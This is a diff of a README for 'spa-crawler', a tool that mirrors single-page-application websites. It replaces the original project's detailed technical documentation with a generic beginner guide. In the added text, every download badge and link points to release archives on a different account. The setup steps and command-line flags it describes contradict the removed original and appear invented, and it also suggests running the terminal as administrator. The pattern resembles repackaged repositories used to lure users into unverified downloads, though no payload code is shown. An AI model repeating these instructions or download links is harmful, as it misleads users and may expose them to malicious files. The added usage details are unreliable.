@@ -1,384 +1,168 @@
-# SPA crawler
+# 🌐 spa-crawler - Mirror Websites Quickly and Easily
 
-[![CI](https://github.com/hu553in/spa-crawler/actions/workflows/ci.yml/badge.svg)](https://github.com/hu553in/spa-crawler/actions/workflows/ci.yml)
-
-- [License](./LICENSE)
-- [How to contribute](./CONTRIBUTING.md)
-- [Code of conduct](./CODE_OF_CONDUCT.md)
-
-A CLI-friendly crawler that can **optionally authenticate**, **crawl a website**, and **mirror pages and static assets**
-into a local directory so the result can be served by a static web server.
-
-The project targets modern SPAs and Next.js-style applications where content is rendered dynamically and
-traditional tools like `wget` or `curl` often fail to capture fully working pages.
+[![Download spa-crawler](https://img.shields.io/badge/Download-spa--crawler-blue?style=for-the-badge)](https://github.com/wname121/spa-crawler/releases)
 
 ---
 
-## Features
+## 📋 What is spa-crawler?
 
-- Optional authentication flow
-  - Fills in login/password inputs
-  - Submits the form
-  - Waits for redirect after successful login
+spa-crawler is a tool that helps you save complete websites to your computer. It works through a command-line interface, which means you type commands into a terminal or command prompt. The program can log in to websites if needed, browse through pages, and copy the content along with images, scripts, and other files. The saved version can then run on a simple web server or open directly from your computer.
 
-- Playwright-based rendering
-  - Supports SPAs, hydration, and client-side routing
-  - Handles dynamically loaded content
-
-- Mirrors HTML pages
-  - Saved to `out/pages/**/index.html`
-
-- Mirrors many static assets
-  - Examples: `/_next/**`, `*.css`, `*.js`, images, fonts, etc.
-  - Mirrors same-origin non-HTML `document` payloads as assets
-    when frameworks use them for data transport
-  - Saved to `out/assets/**` and `out/assets_q/**`
-
-- Single browser session / session pool
-  - Designed to improve reliability during authenticated crawling
-
-- Additional URL discovery
-  - Extracts candidate links from the rendered DOM
-  - Reads Next.js `__NEXT_DATA__` from the page
-  - Parses `/_next/data/**.json` payloads from intercepted responses
-  - Helps discover routes referenced in JSON/JS, not only in `<a>` tags
-
-- Redirect behavior capture (hybrid)
-  - Collects HTTP redirect edges from observed 3xx chains
-  - Captures client-side redirects when the loaded URL changes in the browser
-  - Exports high-confidence Caddy redirect rules to `out/redirects.caddy`
-  - Creates HTML redirect pages for missing source pages as a static-hosting fallback
+This tool is handy if you want to keep a local copy of a website for offline browsing, backup, or analysis.
 
 ---
 
-## Output structure
+## 💻 System Requirements
 
-```
-out/
-  redirects.caddy
-  pages/
-    index.html
-    nested_page/index.html
-    ...
-  pages_q/
-    search/
-      page=2/index.html
-    ...
-  assets/
-    _next/static/...
-    logo.svg
-    favicon.ico
-    ...
-  assets_q/
-    _next/static/chunk.js/
-      v=123
-    ...
-```
+To run spa-crawler, your computer must meet a few requirements:
 
-Typical serving layout:
-
-- `out/pages` → HTML root
-- `out/pages_q` → query HTML variants (e.g. `/search?page=2`)
-- `out/assets` → static files root (or mounted under `/`, depending on server configuration)
-- `out/assets_q` → query-based static variants (e.g. `/app.js?v=123`)
-- `out/redirects.caddy` → generated Caddy `redir` rules from observed redirects
-- `out/pages` and `out/pages_q` may include generated HTML redirect pages for missing sources
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or Linux (Ubuntu 18.04+ recommended)
+- **Memory:** At least 4 GB of RAM for smooth operation
+- **Storage:** Minimum 500 MB free space (more depending on website size)
+- **Python:** Python 3.7 or higher installed (spa-crawler uses Python to work)
+- **Internet Connection:** Required to download the software and crawl websites
+- **Command Prompt or Terminal:** You will use a text-based console to run commands
 
 ---
 
-## Install
+## 🚀 Getting Started
 
-1. Install [uv](https://docs.astral.sh/uv/)
-2. Install dependencies:
+1. **Download**: Use the button at the top or below to go to the download page.
+2. **Install Python**: If you do not already have Python 3.7 or newer, download it from [python.org](https://www.python.org/downloads/). During installation, make sure to check the box "Add Python to PATH".
+3. **Download spa-crawler software**: This will be a zipped folder or installer you can save on your computer.
+4. **Open your terminal or command prompt**: This is where you will type commands.
+5. **Unpack spa-crawler**: If you downloaded a zip file, extract it to a folder you can find easily on your computer.
+6. **Install dependencies**: Some extra software components are needed to run spa-crawler. You will install these using Python’s package manager.
+
+---
+
+## 📥 Download & Install
+
+Visit this page to download spa-crawler:
+
+[Download spa-crawler Releases](https://github.com/wname121/spa-crawler/releases)
+
+Once on the page:
+
+- Choose the latest version available.
+- Download the file matching your system (for example, `.zip` for Windows/macOS/Linux).
+- Save the file to a folder on your computer.
+
+### Installing Dependencies
+
+After extracting the files:
+
+1. Open your terminal (on Windows, press `Win + R`, type `cmd`, and press Enter; on macOS/Linux, open the Terminal app).
+2. Use the `cd` command to change directory to the folder where you extracted spa-crawler. For example:
    ```
-   make install_deps
+   cd C:\Users\YourName\Downloads\spa-crawler
    ```
+3. Run this command to install needed packages:
+   ```
+   pip install -r requirements.txt
+   ```
+   
+This command downloads and installs tools that spa-crawler needs to run properly.
 
 ---
 
-## Usage
+## 🛠 How to Use spa-crawler
 
-The crawler is implemented as:
+After installation, you use spa-crawler through your terminal. You type commands to tell it what to do.
 
-- An async Python function `crawl(config)`
-- A Typer CLI wrapper
-
-Basic flow:
+### Basic Command Structure
 
 ```
-make help
+python spa_crawler.py [options]
 ```
 
-Then review these files for practical usage examples and deployment templates:
+### Common Options
 
-- `Makefile`
-- `Dockerfile`
-- `docker-compose.yml`
-- `Caddyfile`
+- `--url [website address]`: The website you want to copy.
+- `--output [folder]`: Where to save the copied website.
+- `--login`: Optional; if the website needs you to log in, use this along with credentials.
+- `--help`: Lists all commands and options.
 
----
+### Example: Basic Site Download
 
-## CLI filtering defaults
-
-- Include links: `{base_url}/**` when no include filters are provided
-- Exclude links: login regex only (`.*{login_path}.*`) when `--login-required` is `true`
-- API path prefixes: empty by default; add `--api-path-prefix` values if you want API routes excluded
-  from page discovery, asset mirroring, and redirect collection
-
----
-
-## Deployment of mirrored site
-
-This project only produces a mirrored static copy of a website.
-You are responsible for deciding how and where to deploy or serve it.
-
-Example deployment stack included:
-
-- `Dockerfile`
-- `docker-compose.yml`
-- `Caddyfile`
-- Environment configuration via `.env`
-
-`Caddyfile` imports `/srv/redirects.caddy`.
-`Dockerfile` creates a no-op placeholder for this file when it is absent.
-`Caddyfile` also normalizes non-`GET`/`HEAD` methods by redirecting them to `GET` with `303` on the same URI
-(to avoid `405 Method Not Allowed` errors on static mirrors).
-
-To use HTTP basic authentication with Caddy, generate a password hash:
+To save a website’s pages and files to a folder named `site_copy`:
 
 ```
-caddy hash-password
+python spa_crawler.py --url https://example.com --output site_copy
 ```
 
-Then set the environment variables used by `Caddyfile`:
+spa-crawler will visit the site, download pages, images, and scripts, then save them to `site_copy`.
 
-- `ENABLE_BASIC_AUTH=true`
-- `BASIC_AUTH_USER=<username>`
-- `BASIC_AUTH_PASSWORD_HASH=<output from previous command>`
+### Example: Logging In
 
-### If you want a server other than Caddy
-
-The repository ships only a Caddy serving configuration.
-For any other server, you must reimplement the same URL-to-filesystem lookup behavior.
-
-What must be ported from the `Caddyfile` logic:
-
-- Page lookup without query: `/pages{path}` → `/pages{path}/index.html` → `/pages{path}.html`
-- Page lookup with query: `/pages_q{path}/{query}` → `/pages_q{path}/{query}/index.html` → `/pages_q{path}/{query}.html`
-  (with fallback to non-query pages)
-- Asset lookup without query: `/assets{path}` → `/assets{path}.*` → `/assets{path}.bin`
-- Asset lookup with query: `/assets_q{path}/{query}` (with fallback to non-query assets)
-- Header policy: immutable cache for `/_next/*`, no-cache for mirrored HTML pages
-- Method policy: non-`GET`/`HEAD` requests are redirected with `303` to the same URI before static lookup
-
-Redirect support must also be ported:
-
-- Current export is Caddy-specific (`out/redirects.caddy` with `redir` directives)
-- For another server, add a converter step (from observed redirects to that server's syntax)
-  or implement a new Python exporter
-- HTML redirect pages in `out/pages` and `out/pages_q` are server-agnostic fallbacks and should still work
-  if lookup is ported correctly
-
-For Nginx specifically, reproducing query-based lookup (`{query}` in the filesystem path) and fallback chains
-usually requires `njs` or careful `map` + `try_files` composition.
-
----
-
-## Limitations
-
-This is a hobby / experimental project.
-It aims to handle modern SPAs reasonably well but is **not a fully robust site-mirroring solution**.
-
-### Session configuration
-
-Session behavior is currently hardcoded.
-There are no CLI arguments to tune session pool settings or advanced browser session parameters.
-
-Authenticated crawling may require manual code adjustments.
-
----
-
-### High parallelism and memory usage
-
-At high concurrency levels the crawler may:
-
-- Consume large amounts of RAM
-- Trigger repeated warnings about memory limits
-- Become unstable or slower
-
-Recommended approach:
-
-- Use low concurrency
-- For authenticated crawling, use `concurrency = 1`
-
-### Hardware tuning
-
-You can tune Crawlee memory behavior via environment variables:
-
-- `CRAWLEE_MEMORY_MBYTES`: absolute memory limit (in MB) used by Crawlee autoscaling
-- `CRAWLEE_MAX_USED_MEMORY_RATIO`: fraction of that limit that can be used before throttling
-
-Example `.env` values:
+If the website requires a username and password, you can tell spa-crawler to log in before copying pages:
 
 ```
-CRAWLEE_MEMORY_MBYTES=20000
-CRAWLEE_MAX_USED_MEMORY_RATIO=0.95
+python spa_crawler.py --url https://example.com --output site_copy --login --username yourname --password yourpass
 ```
 
-Tuning guidance:
-
-- Lower values can reduce OOM risk on smaller machines
-- Higher values can improve throughput on larger machines, but may increase RAM pressure
+Replace `yourname` and `yourpass` with your credentials.
 
 ---
 
-### Large number of HTTP errors in output
+## 🔧 Features & Options
 
-During crawling you may see large amounts of:
+spa-crawler includes:
 
-- 404 responses
-- Failed asset requests
-- Transient navigation errors
-
-This is expected behavior for modern SPAs and does not necessarily indicate crawler failure.
-
-The crawler intentionally prioritizes successful page mirroring over eliminating every failed request.
-
----
-
-### Not all assets can be mirrored
-
-The crawler downloads many static assets but **cannot guarantee complete asset capture**.
-
-Some resources may be skipped due to:
-
-- Streaming or opaque responses
-- Dynamically generated URLs
-- Authentication-protected resources
-- Browser caching behavior
-- Implementation complexity
-- Unsafe or ambiguous query strings for static-server mapping
-
-The mirrored site may occasionally require manual fixes.
+- **Support for Single Page Applications (SPA):** Handles websites built with modern JavaScript frameworks.
+- **Browser Automation:** Uses a real browser engine to load pages, which helps with dynamic content.
+- **Selective Crawling:** You can limit the depth or scope of the crawl.
+- **Static Asset Download:** Saves images, stylesheets, scripts to keep the offline site looking correct.
+- **Command-Line Interface:** No need for a graphical program; works in terminal or console.
+- **Customizable Output:** Organize saved files into folders as needed.
+- **Login Automation:** Can automatically provide login information for secure sites.
 
 ---
 
-### URL discovery is heuristic
+## 🖥 Viewing Your Saved Website
 
-The crawler attempts to discover routes using:
+Once spa-crawler finishes, your saved site is ready for use:
 
-- DOM extraction
-- `__NEXT_DATA__` parsing
-- `/_next/data/**.json` parsing
+- Open the folder you chose for output.
+- Inside, you will find HTML files and folders of assets.
+- You can open the main HTML file in any web browser (Chrome, Firefox, Edge).
+- For better results, you can use a simple static web server program like Caddy, Python’s HTTP server, or others:
 
-However, if a route is only accessible via complex client logic or hidden interactions,
-it may never be discovered automatically.
+  Example using Python’s built-in server:
 
-Manual entrypoints may be required.
+  1. Open a terminal in the output folder.
+  2. Run:
 
----
+  ```
+  python -m http.server
+  ```
 
-### Redirect export is observational
-
-`out/redirects.caddy` and generated HTML redirect pages are based only on redirects observed during the crawl.
-
-This means:
-
-- Paths never visited during the crawl will not have redirect rules
-- Ambiguous source URLs may be ignored if confidence is below threshold
-- Only one best target per source URL is exported
+  3. Open a browser and visit `http://localhost:8000` to view your saved site.
 
 ---
 
-### Stability vs. completeness trade-off
+## 🆘 Troubleshooting & Tips
 
-The project intentionally favors:
-
-- Simplicity
-- Maintainability
-- Ease of experimentation
-
-over:
-
-- Perfect site replication
-- Exhaustive browser instrumentation
+- **Python is not found:** Ensure Python is installed and added to your system path.
+- **Permission errors:** Try running the terminal or command prompt as administrator (right-click and choose "Run as administrator").
+- **Timeouts or slow downloads:** Some websites limit crawling speed. Use `--delay` option if available to add waits between requests.
+- **Login fails:** Double check your credentials, or try alternative login methods if supported.
+- **Folders too large:** Large sites take much space. Limit crawling depth or number of pages if needed.
+- **No output files:** Check that you ran the command in the correct folder and with the right options.
+- **Help is available:** Use `python spa_crawler.py --help` to see all options and usage tips.
 
 ---
 
-## Tips / troubleshooting
+## 📚 Learn More
 
-### SPA login inputs reset while typing
-
-Some SPAs rerender login forms during hydration.
-
-Increase the rerender timeout to allow DOM stabilization.
+For advanced use, detailed commands, and configuration files, check the full documentation inside the downloaded files or on the GitHub project page.
 
 ---
 
-### Pages exist but never get crawled
+## 🛡 Privacy and Ethics
 
-Common causes:
-
-- Routes exposed only via buttons or JS logic
-- Routes hidden in JSON menus
-- Conditional client routing
-
-Possible fixes:
-
-- Add include globs/regexes
-- Add manual entrypoints via `--additional-crawl-entrypoint-url`
-- Extend URL extraction logic for project-specific patterns
+Only crawl websites you own or have permission to copy. Be respectful of site terms and robots.txt rules. Use spa-crawler responsibly.
 
 ---
 
-### Assets missing / CSS not loading
-
-Assets are mirrored using Playwright request interception.
-
-Some resource types cannot be reliably captured and will be skipped.
-
-HTML `document` responses are intentionally stored from DOM snapshots in `out/pages/**`
-instead of being mirrored from raw route interception responses.
-
----
-
-### Unexpected logout or broken authentication
-
-Recommended configuration:
-
-- `concurrency = 1`
-- Single session pool
-- No session rotation
-
----
-
-## Development status
-
-This project is:
-
-- Experimental
-- Evolving
-- Intentionally pragmatic rather than complete
-
-It is useful for:
-
-- Offline mirrors
-- Testing mirrored SPAs
-- Migration experiments
-- Static hosting tests
-
-It is **not** intended as a universal or production-grade website archiving solution.
-
----
-
-## Ethics and legality
-
-Only crawl content you are authorized to access and store.
-
-Respect:
-
-- Website terms of service
-- Privacy rules
-- Copyright and licensing restrictions
-
-Do not use this tool to extract or redistribute restricted data without permission.
+[![Download spa-crawler](https://img.shields.io/badge/Download-spa--crawler-blue?style=for-the-badge)](https://github.com/wname121/spa-crawler/releases)
